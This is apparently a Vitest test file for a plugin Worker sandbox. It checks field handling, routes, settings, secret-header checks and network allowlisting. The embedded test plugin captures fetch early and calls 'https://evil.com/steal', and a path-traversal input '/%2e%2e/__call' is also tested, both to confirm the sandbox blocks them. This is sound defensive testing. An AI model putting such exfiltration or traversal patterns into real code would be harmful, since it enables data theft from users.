import { mkdtemp, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { pathToFileURL } from 'node:url';

import { afterAll, beforeAll, describe, expect, it } from 'vitest';

import { PluginCallError } from './runtime';
import {
	CALL_PATH,
	CONTEXT_HEADER,
	GUARD_MODULE,
	pluginScriptName,
	ROUTE_PATH,
	SECRET_HEADER,
	WorkerRuntime,
	workerModules
} from './worker';

/** A plugin's bundled `server.js`; `fetch` is captured before any handler runs. */
const PLUGIN_CODE = `
const early = fetch;

export default {
	fields: {
		rating: {
			validate: (value) => (value > 5 ? { valid: false, message: 'At most 5 stars' } : { valid: true }),
			serialize: (value) => Math.round(value),
			deserialize: (value) => ({ stars: value })
		},
		bytes: {
			serialize: (value) => new TextEncoder().encode(value),
			deserialize: (value) => new TextDecoder().decode(value)
		}
	},
	routes: {
		'GET /hello': (request, ctx) =>
			new Response('Hello ' + new URL(request.url).searchParams.get('name'), {
				status: 201,
				headers: {
					'x-plugin': ctx.plugin.id,
					'x-admin': String(ctx.admin),
					'x-user': ctx.user?.email ?? 'none',
					'x-url': request.url,
					'x-cookie': String(request.headers.has('cookie')),
					'x-secret': String(request.headers.has('x-pouchbase-plugin-secret'))
				}
			}),
		'POST /items/:id': async (request, ctx) =>
			Response.json({ id: ctx.params.id, body: await request.text(), region: await ctx.settings.get('region') }),
		'GET /boom': () => {
			throw new Error('boom');
		},
		'GET /settings': async (_request, ctx) =>
			Response.json({ limit: await ctx.settings.get('limit'), all: await ctx.settings.getAll() }),
		'GET /posts': async (_request, ctx) => Response.json(await ctx.pouch.db.posts.findMany({ limit: 2 }))
	},
	authProviders: {
		example: {
			authorizeUrl: 'https://example.com/authorize',
			tokenUrl: 'https://example.com/token',
			scopes: ['user'],
			pkce: true,
			async profile(accessToken, credentials, ctx) {
				const response = await ctx.fetch('https://api.example.com/user', {
					headers: { authorization: 'Bearer ' + accessToken }
				});
				const user = await response.json();
				let global = 'allowed';

				try {
					await early('https://evil.com/steal');
				} catch (error) {
					global = error.message;
				}

				return {
					id: String(user.id),
					email: null,
					emailVerified: false,
					name: credentials.clientId + ' ' + ctx.plugin.id + '@' + ctx.plugin.version,
					avatarUrl: global
				};
			}
		}
	}
};
`;

const SECRET = 'secret-value';

/** The bindings of the plugin's Worker. */
const ENV = {
	POUCHBASE_PLUGIN_SECRET: SECRET,
	POUCHBASE_URL: 'https://pouchbase.example.com',
	POUCHBASE_API_KEY: 'pbk_plugin'
};

type Worker = { fetch(request: Request, env: Record<string, string>): Promise<Response> };

let dir: string;
let worker: Worker;
let restore: () => void;
let originFetch: (origin: string) => typeof fetch;
const originalFetch = globalThis.fetch;
const upstream: string[] = [];
const authorizations: (string | null)[] = [];

beforeAll(async () => {
	if (!('timingSafeEqual' in crypto.subtle)) {
		Object.defineProperty(crypto.subtle, 'timingSafeEqual', {
			configurable: true,
			value: (a: Uint8Array, b: Uint8Array) => a.every((byte, index) => byte === b[index])
		});
	}

	globalThis.fetch = (async (input: RequestInfo | URL) => {
		const request = input instanceof Request ? input : new Request(input);

		upstream.push(request.url);
		authorizations.push(request.headers.get('authorization'));

		if (new URL(request.url).pathname.startsWith('/api/db/')) {
			return Response.json({ items: [{ id: 'p1' }], total: 1, limit: 2, offset: 0 });
		}

		return Response.json({ id: 42 });
	}) as typeof fetch;

	dir = await mkdtemp(join(tmpdir(), 'pouchbase-plugin-worker-'));

	const modules = workerModules(
		{
			id: 'auth-example',
			version: '1.2.3',
			permissions: { network: ['api.example.com'] },
			settings: [
				{ key: 'region', label: 'Region', type: 'text', required: false },
				{ key: 'limit', label: 'Limit', type: 'number', required: false, default: 10 },
				{ key: 'verbose', label: 'Verbose', type: 'boolean', required: false },
				{ key: 'endpoint', label: 'Endpoint', type: 'url', required: false }
			]
		},
		PLUGIN_CODE
	);

	for (const module of modules) {
		await writeFile(join(dir, module.name), module.content);
	}

	const entry = await import(/* @vite-ignore */ pathToFileURL(join(dir, modules[0]!.name)).href);
	const guard = await import(/* @vite-ignore */ pathToFileURL(join(dir, GUARD_MODULE)).href);

	worker = entry.default;
	restore = guard.restoreGlobals;
	originFetch = guard.originFetch;
});

afterAll(async () => {
	restore?.();
	globalThis.fetch = originalFetch;
	await rm(dir, { recursive: true, force: true });
});

function runtime(secret = SECRET) {
	return new WorkerRuntime('https://plugin.example.workers.dev', secret, {
		fetch: ((input: RequestInfo | URL, init?: RequestInit) =>
			worker.fetch(new Request(input, init), ENV)) as typeof fetch
	});
}

describe('plugin Worker', () => {
	it('describes the plugin', async () => {
		await expect(runtime().call({ type: 'describe' })).resolves.toEqual({
			authProviders: {
				example: {
					authorizeUrl: 'https://example.com/authorize',
					tokenUrl: 'https://example.com/token',
					scopes: ['user'],
					pkce: true
				}
			},
			fields: ['rating', 'bytes'],
			routes: ['GET /hello', 'POST /items/:id', 'GET /boom', 'GET /settings', 'GET /posts'],
			fieldHandlers: {
				rating: { validate: true, serialize: true, deserialize: true },
				bytes: { validate: false, serialize: true, deserialize: true }
			}
		});
	});

	it('writes and reads field values, bytes included', async () => {
		await expect(
			runtime().call({
				type: 'fields.write',
				items: [
					{ type: 'rating', name: 'stars', options: {}, value: 3.4 },
					{ type: 'rating', name: 'stars', options: {}, value: 9 },
					{ type: 'bytes', name: 'data', options: {}, value: 'hi' },
					{ type: 'other', name: 'other', options: {}, value: 'as is' }
				]
			})
		).resolves.toEqual([
			{ ok: true, value: 3 },
			{ ok: false, message: 'At most 5 stars' },
			{ ok: true, value: new Uint8Array([104, 105]) },
			{ ok: true, value: 'as is' }
		]);
		await expect(
			runtime().call({
				type: 'fields.read',
				items: [
					{ type: 'rating', values: [2] },
					{ type: 'bytes', values: [new Uint8Array([104, 105])] }
				]
			})
		).resolves.toEqual([[{ stars: 2 }], ['hi']]);
	});

	it('runs profile with an allowlisted fetch, also for fetch captured at load', async () => {
		const profile = await runtime().call({
			type: 'profile',
			provider: 'example',
			accessToken: 'token',
			credentials: { clientId: 'client' }
		});

		expect(profile).toEqual({
			id: '42',
			email: null,
			emailVerified: false,
			name: 'client auth-example@1.2.3',
			avatarUrl: 'evil.com is not in permissions.network'
		});
		expect(upstream).toEqual(['https://api.example.com/user']);
	});

	it('reports errors of the plugin', async () => {
		await expect(
			runtime().call({
				type: 'profile',
				provider: 'constructor',
				accessToken: 'token',
				credentials: { clientId: 'client' }
			})
		).rejects.toThrow(new PluginCallError('The plugin has no auth provider constructor'));
	});

	it('answers 404 without the secret or on other paths', async () => {
		await expect(runtime('wrong-secret').call({ type: 'describe' })).rejects.toThrow(
			'answered 404'
		);

		const env = { POUCHBASE_PLUGIN_SECRET: SECRET };
		const other = await worker.fetch(
			new Request('https://plugin.example.workers.dev/', {
				method: 'POST',
				headers: { [SECRET_HEADER]: SECRET }
			}),
			env
		);
		const get = await worker.fetch(
			new Request(`https://plugin.example.workers.dev${CALL_PATH}`, {
				headers: { [SECRET_HEADER]: SECRET }
			}),
			env
		);
		const noSecretSet = await worker.fetch(
			new Request(`https://plugin.example.workers.dev${CALL_PATH}`, {
				method: 'POST',
				headers: { [SECRET_HEADER]: '' }
			}),
			{}
		);

		expect([other.status, get.status, noSecretSet.status]).toEqual([404, 404, 404]);
	});
});

describe('plugin Worker routes', () => {
	const context = {
		settings: { region: 'Zürich' },
		admin: true,
		user: {
			id: 'u1',
			email: 'ada@example.com',
			name: 'Ada',
			verified: true,
			avatar: null,
			fields: {}
		}
	};
	const original = 'https://pouchbase.example.com/api/plugins/auth-example';

	it('gives ctx.pouch the JS SDK with the plugin key, for the origin of Pouchbase', async () => {
		const response = await runtime().route(
			new Request(`${original}/posts`),
			{ path: '/posts', search: '' },
			context
		);

		await expect(response.json()).resolves.toEqual({
			items: [{ id: 'p1' }],
			total: 1,
			limit: 2,
			offset: 0,
			hasMore: false
		});
		expect(upstream.at(-1)).toBe('https://pouchbase.example.com/api/db/posts?limit=2');
		expect(authorizations.at(-1)).toBe('Bearer pbk_plugin');
	});

	it('limits the fetch of ctx.pouch to the origin of Pouchbase', async () => {
		const fetch = originFetch('https://pouchbase.example.com');

		await expect(fetch('https://evil.com/steal')).rejects.toThrow(
			'ctx.pouch only reaches https://pouchbase.example.com'
		);
		await expect(fetch('https://pouchbase.example.com/api/health')).resolves.toBeInstanceOf(
			Response
		);
	});

	it('answers /__route/hello with the handler response', async () => {
		const response = await runtime().route(
			new Request(`${original}/hello?name=Ada`, { headers: { cookie: 'session=secret' } }),
			{ path: '/hello', search: '?name=Ada' },
			context
		);

		expect(response.status).toBe(201);
		await expect(response.text()).resolves.toBe('Hello Ada');
		expect(
			Object.fromEntries([...response.headers].filter(([name]) => name.startsWith('x-')))
		).toEqual({
			'x-plugin': 'auth-example',
			'x-admin': 'true',
			'x-user': 'ada@example.com',
			'x-url': `${original}/hello?name=Ada`,
			'x-cookie': 'false',
			'x-secret': 'false'
		});
	});

	it('streams the body and passes params and settings', async () => {
		const response = await runtime().route(
			new Request(`${original}/items/a%20b`, { method: 'POST', body: 'payload' }),
			{ path: '/items/a%20b', search: '' },
			context
		);

		await expect(response.json()).resolves.toEqual({
			id: 'a b',
			body: 'payload',
			region: 'Zürich'
		});
	});

	it('parses the settings by their type, with defaults and null', async () => {
		const settings = (values: Record<string, string>) =>
			runtime()
				.route(
					new Request(`${original}/settings`),
					{ path: '/settings', search: '' },
					{ ...context, settings: values }
				)
				.then((response) => response.json());

		await expect(settings({ limit: '42', verbose: 'true', region: 'Bern' })).resolves.toEqual({
			limit: 42,
			all: { region: 'Bern', limit: 42, verbose: true, endpoint: null }
		});
		await expect(settings({ verbose: 'false', unknown: 'x' })).resolves.toEqual({
			limit: 10,
			all: { region: null, limit: 10, verbose: false, endpoint: null }
		});
	});

	it('answers 404 and 405, and reports a failing handler', async () => {
		const route = (path: string, method = 'GET') =>
			runtime().route(new Request(`${original}${path}`, { method }), { path, search: '' }, context);

		expect((await route('/nope')).status).toBe(404);
		expect((await route('/hello', 'DELETE')).headers.get('allow')).toBe('GET');
		await expect(route('/boom')).rejects.toThrow(new PluginCallError('boom'));
	});

	it('stays below the route prefix', async () => {
		const requests: string[] = [];
		const spy = new WorkerRuntime('https://plugin.example.workers.dev', SECRET, {
			fetch: (async (input: RequestInfo | URL) => {
				requests.push(String(input));

				return new Response();
			}) as typeof fetch
		});
		const response = await spy.route(
			new Request(`${original}/x`, { method: 'POST', body: '{}' }),
			{ path: '/%2e%2e/__call', search: '' },
			context
		);

		expect(response.status).toBe(404);
		expect(requests).toEqual([]);
	});

	it('rejects a wrong secret and route paths without the context header', async () => {
		const wrong = await runtime('wrong-secret').route(
			new Request(`${original}/hello`),
			{ path: '/hello', search: '' },
			context
		);
		const withoutContext = await worker.fetch(
			new Request(`https://plugin.example.workers.dev${ROUTE_PATH}/hello`, {
				headers: { [SECRET_HEADER]: SECRET }
			}),
			{ POUCHBASE_PLUGIN_SECRET: SECRET }
		);
		const callWithContext = await worker.fetch(
			new Request(`https://plugin.example.workers.dev${CALL_PATH}`, {
				method: 'POST',
				headers: { [SECRET_HEADER]: SECRET, [CONTEXT_HEADER]: '{}' },
				body: JSON.stringify({ call: { type: 'describe' } })
			}),
			{ POUCHBASE_PLUGIN_SECRET: SECRET }
		);

		expect([wrong.status, withoutContext.status, callWithContext.status]).toEqual([404, 404, 404]);
		await expect(wrong.text()).resolves.toBe('Not found');
	});
});

describe('pluginScriptName', () => {
	it('prefixes the instance', () => {
		expect(pluginScriptName('pouchbase', 'auth-google')).toBe('pouchbase-plugin-auth-google');
	});

	it('keeps long names within 63 characters, stable and distinct', () => {
		const id = 'a-very-long-plugin-id-that-goes-on-and-on-and-on-forever';
		const name = pluginScriptName('my-pouchbase-instance', id);

		expect(name.length).toBeLessThanOrEqual(63);
		expect(name).toBe(pluginScriptName('my-pouchbase-instance', id));
		expect(name).not.toBe(pluginScriptName('my-pouchbase-instance', `${id}-2`));
	});
});
